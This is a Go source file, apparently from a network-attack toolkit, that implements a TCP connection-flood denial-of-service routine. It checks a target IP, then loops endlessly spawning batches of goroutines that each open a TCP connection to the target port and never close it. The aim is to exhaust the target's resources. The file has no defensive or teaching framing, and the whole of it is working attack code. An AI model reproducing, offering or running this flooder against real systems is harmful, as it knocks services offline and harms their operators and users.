package services

import (
	"fmt"
	"net"
	"sync"
	"time"
)

func attemptConnection(ip string, port int, wg *sync.WaitGroup, verbose *bool) {
	defer wg.Done()

	socketAddress := fmt.Sprintf("%s:%d", ip, port)
	_, err := net.Dial("tcp", socketAddress)
	if err != nil {
		fmt.Println("Error:", err)
		return
	}

	currentTime := time.Now()
	if *verbose {
		fmt.Printf("[%s] - TCP Connection Flood - Connection Estabilshed at %s:%d\n", currentTime.Format("2006-01-02 15:04:05"), ip, port)
	}
}

func TcpConnectionFlood(ip *string, port *int, numRoutines *int, verbose *bool) {

	if net.ParseIP(*ip) == nil {
		fmt.Println("Invalid IP address")
		return
	}

	if !*verbose {
		fmt.Println("TCP Connection Flood DoS has been initialized.")
	}

	var wg sync.WaitGroup

	for {
		for i := 0; i < *numRoutines; i++ {
			wg.Add(1)
			go attemptConnection(*ip, *port, &wg, verbose)
		}
		wg.Wait()
	}
}
